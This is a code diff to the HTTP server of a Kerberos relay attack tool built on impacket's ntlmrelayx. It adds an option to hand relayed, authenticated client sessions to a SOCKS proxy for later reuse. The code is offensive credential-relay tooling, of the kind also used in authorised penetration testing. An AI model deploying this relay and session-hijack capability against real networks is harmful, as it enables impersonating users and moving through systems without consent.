@@ -15,6 +15,7 @@ from six import PY2, b
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
 from lib.utils.kerberos import get_kerberos_loot, get_auth_data
 
@@ -138,7 +139,7 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             if b'NTLMSSP' in token:
                 LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                 return
-            
+
             if self.server.config.mode == 'ATTACK':
                 # Are we in attack mode? If so, launch attack against all targets
                 # If you're looking for the magic, it's in lib/utils/kerberos.py
@@ -186,6 +187,13 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                     client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                     if not client.initConnection(authdata, self.server.config.dcip):
                         return
+                    # Check if SOCKS is enabled
+                    if self.config.runSocks and target.scheme.upper() in self.config.socksServer.supportedSchemes:
+                        if self.config.runSocks is True:
+                            #Pass all the data to the sockspluginsproxy
+                            activeConnections.put((target.hostname, client.targetPort, target.scheme.upper(),
+                                                self.authUser, client, client.sessionData))
+                            return
                     # We have an attack.. go for it
                     attack = self.server.config.attacks[parsed_target.scheme.upper()]
                     client_thread = attack(self.server.config, client.session, self.authUser)
